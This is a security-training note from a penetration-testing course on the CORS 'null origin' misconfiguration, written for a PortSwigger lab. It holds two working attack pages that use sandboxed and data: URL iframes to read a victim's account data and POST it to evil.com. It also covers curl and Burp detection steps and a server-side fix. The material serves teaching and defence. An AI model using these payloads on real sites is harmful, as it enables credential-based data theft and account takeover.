---
tags: [vapt, cors, intermediate]
difficulty: intermediate
module: "12 - CORS"
topic: "12.05 Null Origin Misconfiguration"
portswigger_labs: ["CORS vulnerability with trusted null origin"]
---

# 12.05 — Null Origin Misconfiguration

## What Is the null Origin?

```
THE null ORIGIN:
  Some requests send "Origin: null" instead of a real origin.
  
  WHEN BROWSER SENDS null ORIGIN:
  ✓ Sandboxed iframes: <iframe sandbox src="...">
  ✓ Data: URLs: <iframe src="data:text/html,...">
  ✓ File: URLs: opening a local HTML file in browser
  ✓ Cross-origin redirects (in some browsers)
  ✓ Privacy-sensitive contexts (some browser settings)
  
  Request:
    Origin: null
  
  VULNERABLE RESPONSE:
    Access-Control-Allow-Origin: null
    Access-Control-Allow-Credentials: true
  
  EFFECT: Sandboxed iframes and data: URLs can read responses!
  
WHY IT HAPPENS:
  Developers add null to allowlist thinking it's harmless.
  "No origin = same-origin = safe" — WRONG!
  null origin is from UNTRUSTED contexts like data: URLs!
```

---

## The null Origin Attack

```html
<!-- ATTACKER'S PAGE: -->
<!-- The iframe has sandbox="allow-scripts" which triggers null origin -->

<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="
<script>
  fetch('https://target.com/api/account', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
      // iframe sends Origin: null
      // server returns ACAO: null + ACAC: true
      // script inside iframe can read the response!
      
      // Send data out (parent window can receive postMessage):
      top.postMessage(JSON.stringify(data), '*');
    });
</script>
">
</iframe>

<script>
  // Parent receives the exfiltrated data:
  window.addEventListener('message', function(e) {
    console.log('Stolen data:', e.data);
    // Send to attacker's server:
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: e.data
    });
  });
</script>
```

---

## Data: URL Attack Alternative

```html
<!-- ALTERNATIVE ATTACK USING data: URL IN IFRAME: -->
<html>
<body>
<script>
  // Create a data: URL that makes the cross-origin request
  const payload = `
    <script>
      fetch('https://target.com/api/account', {credentials: 'include'})
        .then(r => r.json())
        .then(data => {
          window.parent.postMessage(JSON.stringify(data), '*');
        });
    <\/script>
  `;
  
  // Create iframe with data: URL (sends null Origin!)
  const iframe = document.createElement('iframe');
  iframe.src = 'data:text/html,' + encodeURIComponent(payload);
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  
  // Listen for stolen data
  window.addEventListener('message', e => {
    fetch('https://evil.com/steal', {method: 'POST', body: e.data});
  });
</script>
</body>
</html>
```

---

## Detecting null Origin Misconfiguration

```bash
# TEST WITH null ORIGIN:
curl -v \
  -H "Origin: null" \
  -H "Cookie: session=YOUR_SESSION" \
  https://target.com/api/account

# VULNERABLE RESPONSE:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null     ← trusts null!
Access-Control-Allow-Credentials: true

# IN BURP:
# 1. Intercept request to API
# 2. Add header: Origin: null
# 3. Check response — does ACAO say null?
# 4. If yes + ACAC: true → VULNERABLE!

# ALSO TEST WHAT HAPPENS WITH NO ORIGIN:
curl -v \
  -H "Cookie: session=YOUR_SESSION" \
  https://target.com/api/account
# Does it respond with ACAO: null? Some misconfigs do this too!
```

---

## Why null Origin Is Dangerous

```
ATTACKER SCENARIO:
  evil.com hosts the attack page
  evil.com opens a sandboxed iframe OR data: URL
  The iframe sends Origin: null to target.com
  target.com responds with ACAO: null + ACAC: true
  The iframe code reads the response!
  The iframe sends data to evil.com via postMessage!
  
COMPARISON WITH ORIGIN REFLECTION:
  Origin reflection: any origin → attacker uses their own origin directly
  null origin: must use sandboxed iframe or data: URL as intermediary
  
  null origin is slightly harder to exploit but equally dangerous!
  
PRIVILEGE ESCALATION:
  Reading API keys, session tokens, credit cards
  Reading CSRF tokens → bypassing CSRF protection
  Full account takeover chain
```

---

## Fix

```javascript
// WRONG: Trusting null:
const allowed = ['https://app.example.com', 'null'];
if (allowed.includes(request.headers.origin)) allow();

// WRONG: Reflecting null:
if (origin === null || origin === 'null') {
  response.setHeader('Access-Control-Allow-Origin', 'null');
  response.setHeader('Access-Control-Allow-Credentials', 'true');
}

// CORRECT: Never trust null origin for credentialed requests:
const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
const origin = request.headers.origin;

if (origin && allowedOrigins.includes(origin)) {
  response.setHeader('Access-Control-Allow-Origin', origin);
  response.setHeader('Access-Control-Allow-Credentials', 'true');
  response.setHeader('Vary', 'Origin');
}
// If origin is null or not in list → don't add CORS headers
// Browser will block the cross-origin read!
```

---

## Related Notes
- [[01 - What is CORS and Why It Exists]] — CORS fundamentals
- [[04 - Origin Reflection Misconfiguration]] — similar vulnerability
- [[06 - Wildcard with Credentials]] — wildcard bypass
- [[09 - CORS to Credential Theft]] — exploitation chain
- [[12 - Defense Strict Origin Whitelisting]] — how to fix
